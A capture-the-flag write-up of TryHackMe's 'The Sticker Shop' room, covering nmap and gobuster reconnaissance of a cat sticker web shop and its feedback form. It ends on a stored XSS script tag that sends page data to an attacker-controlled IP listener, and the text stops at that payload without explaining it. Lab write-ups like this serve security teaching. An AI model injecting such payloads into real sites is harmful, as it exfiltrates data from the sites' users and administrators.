# Write-Up: The Sticker Shop
[The Sticker Shop](https://tryhackme.com/r/room/thestickershop) is an easy-ranked CTF box that challenges us to access a flag at a specified location of the web server. It introduces us to a common web vulnerability found in websites, seldom being showcased on TryHackMe.

## Reconaissance
We start by scanning the target for open ports using *nmap*.

```
nmap -sV -sC -T4 -p0-65535 sticker.thm
```

```
Host is up (0.037s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 (RSA)
|   256 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 (ECDSA)
|_  256 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 (ED25519)
8080/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.8.10)
|_http-server-header: Werkzeug/3.0.1 Python/3.8.10
|_http-title: Cat Sticker Shop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We see two open ports with the web service being offered on `8080`. Let's open the page in the browser.

![Homepage of hosted website](img/StickerShop-InitialPage.png)

Apart from two buttons and cat images, there is nothing to see.

- We're not able to inspect the `/static/` route or its subfolders, such as `/static/images/`, which contains the image files. The images are sequentially named, i.e. `cat_sticker_1.png`, `cat_sticker_2.png`, and the absence of `cat_sticker_3.png` likely tells us that there are no other images. Since the file format is PNG, no secret information could have been embedded via steganography.
- Inspecting the buttons, we can see that *Home* leads us to `/`, i.e. the position we're currently at, while *Feedback* brings us to `/submit_feedback`. There we find an input form that allows visitors to submit feedback, that is being sent to the URI via POST.


```
gobuster dir -u 'http://sticker.thm:8080/' -w '/usr/share/wordlists/dirb/common.txt'
```

Not much found but "flag.txt".

### XSS
```
<script>var req = new XMLHttpRequest(); req.open("GET", "http://10.9.4.33:8000/" + window.location.href, false); req.send();</script>
```
